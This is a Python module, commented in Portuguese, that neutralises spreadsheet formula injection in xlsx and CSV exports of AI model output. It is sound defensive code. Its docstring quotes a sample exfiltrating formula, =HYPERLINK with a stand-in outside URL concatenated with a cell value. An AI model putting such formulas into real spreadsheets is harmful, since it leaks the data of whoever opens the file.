# -*- coding: utf-8 -*-
"""Texto do modelo não vira fórmula em planilha (item N3, saída insegura).

O Agente BPR grava o que o modelo escreveu no Excel de resultados, e a
tela exporta os mesmos campos em xlsx e csv. Dois caminhos de injeção de
fórmula, que vale fechar mesmo sem ataque conhecido, porque a saída do
modelo é não confiável por princípio (o texto pode vir de um TSSR ou de
uma célula da base que alguém editou):

- xlsx (openpyxl): texto que começa com "=" é gravado como FÓRMULA. Um
  `=HYPERLINK("https://fora/?"&A1)` ou `=WEBSERVICE(...)` rodaria na
  máquina de quem abrir o arquivo. `proteger_linha` força tipo texto: o
  conteúdo fica igual, só não executa.
- csv: o Excel interpreta "=", "+", "-", "@", tabulação e retorno no
  começo da célula. `celula_csv` põe um apóstrofo na frente, a forma que
  o próprio Excel entende como "isto é texto". Número com sinal ("-12,5")
  fica como está.
"""

from __future__ import annotations

import re
from typing import Any, Iterable

_INICIO_PERIGOSO_CSV = ("=", "+", "-", "@", "\t", "\r")
_NUMERO = re.compile(r"^[+-]?\d+([.,]\d+)*%?$")


def proteger_linha(celulas: Iterable[Any]) -> int:
    """Força tipo texto nas células do openpyxl cujo valor viraria fórmula.
    Devolve quantas foram protegidas."""
    protegidas = 0
    for celula in celulas:
        if isinstance(celula.value, str) and celula.value.startswith("="):
            celula.data_type = "s"
            protegidas += 1
    return protegidas


def celula_csv(valor: Any) -> Any:
    # O caractere sozinho ("-" como "sem valor") não é fórmula e fica.
    if (isinstance(valor, str) and len(valor) > 1 and valor.startswith(_INICIO_PERIGOSO_CSV)
            and not _NUMERO.match(valor.strip())):
        return "'" + valor
    return valor
